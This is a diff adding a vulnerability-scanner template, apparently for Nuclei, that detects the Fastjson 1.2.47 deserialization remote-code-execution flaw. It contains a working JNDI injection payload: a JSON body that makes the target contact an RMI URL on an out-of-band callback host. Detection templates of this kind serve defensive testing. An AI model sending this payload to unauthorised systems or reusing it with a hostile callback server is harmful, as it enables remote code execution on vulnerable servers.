@@ -1,0 +1,39 @@
+id: fastjson-1-2-47-rce
+
+info:
+  name: Fastjson 1.2.47 - Remote Code Execution
+  author: zh
+  severity: critical
+  tags: rce,deserialization,oast,vulhub,fastjson
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+            "a":{
+                "@type":"java.lang.Class",
+                "val":"com.sun.rowset.JdbcRowSetImpl"
+            },
+            "b":{
+                "@type":"com.sun.rowset.JdbcRowSetImpl",
+                "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
+                "autoCommit":true
+            }
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms DNS Interaction
+        words:
+          - "dns"
+
+      - type: word
+        condition: and
+        words:
+          - "Bad Request"
+          - "400"
